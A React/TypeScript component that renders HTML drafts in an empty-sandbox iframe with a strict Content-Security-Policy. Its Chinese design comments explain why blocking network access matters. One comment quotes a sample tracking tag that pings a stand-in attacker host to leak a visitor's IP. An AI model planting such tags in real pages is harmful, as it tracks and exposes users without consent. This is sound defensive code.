import React from 'react';

/**
 * HTML 草稿的隔离容器。
 *
 * ## 两道独立的闸，缺一不可
 *
 * 1. `sandbox=""` —— 禁脚本、禁表单提交、禁同源、禁插件、禁顶层导航。
 * 2. `<meta http-equiv="Content-Security-Policy">` —— **禁网络请求**。
 *
 * 为什么两道都要：**sandbox 不管网络**。这是我在一次外部评审里被点出的
 * 真实误区——我原先以为 `sandbox=""` 等于"无脚本 + 无网络"，实际上
 * 一段 `<img src="https://attacker.example/track?id=draft-123">` 在沙箱里
 * 依然会发出请求，白白暴露访问者 IP 与访问时间。这类风险**不依赖 JavaScript**。
 *
 * 所以即使 spec 校验层已经禁掉外链，这里仍然要加 CSP 兜底——
 * 校验层可能被绕过（模型换种写法），CSP 是浏览器强制的最后一层。
 *
 * CSP 里保留 `data:` 的图片/字体与 `'unsafe-inline'` 的样式：
 * 草稿要能显示内联图表与样式，否则预览等于废掉。但 `default-src 'none'`
 * 意味着任何非 data: 的外部请求（脚本、图片、字体、XHR、iframe）都被拒绝。
 *
 * ## 为什么不用 `allow-scripts`
 *
 * `allow-scripts` + `allow-same-origin` 同时开等于没有沙箱（草稿可自行移除
 * sandbox 属性）。本项目草稿不需要脚本，所以两者都不开。
 *
 * ## 高度
 *
 * 固定高度是刻意的：跨源（沙箱）iframe 读不到内容高度，做自适应要么放宽
 * 同源、要么加一条 postMessage 上报通道。本轮先固定，避免为了"好看一点"
 * 牺牲隔离强度。
 */
export interface SandboxedHtmlProps {
  html: string;
  title: string;
  height?: number;
}

/**
 * 内容安全策略。
 *
 * `default-src 'none'` 是总闸：没被下面显式放行的资源类型一律禁止。
 * 放行的只有 data: 图片/字体与内联样式——这些都是"自带内容"，不产生外部请求。
 */
export const SANDBOX_CSP = [
  "default-src 'none'",
  "img-src data:",
  "font-src data:",
  "style-src 'unsafe-inline'",
  "script-src 'none'",
].join('; ');

/** 把草稿包成完整文档并注入 CSP（srcdoc 需要一个整文档才能让 meta 生效）。 */
export function buildSandboxDocument(html: string): string {
  return (
    '<!doctype html><html><head>' +
    `<meta http-equiv="Content-Security-Policy" content="${SANDBOX_CSP}">` +
    '<meta charset="utf-8"></head><body>' +
    html +
    '</body></html>'
  );
}

export const SandboxedHtml: React.FC<SandboxedHtmlProps> = ({
  html,
  title,
  height = 320,
}) => (
  <iframe
    data-testid="sandboxed-html"
    title={title}
    // 空 sandbox = 最严格：无脚本、无表单、无同源。
    sandbox=""
    // srcdoc 里带 CSP：sandbox 不禁网络，这一层才禁。
    srcDoc={buildSandboxDocument(html)}
    style={{ width: '100%', height, border: 0, background: '#fff', display: 'block' }}
  />
);

export default SandboxedHtml;
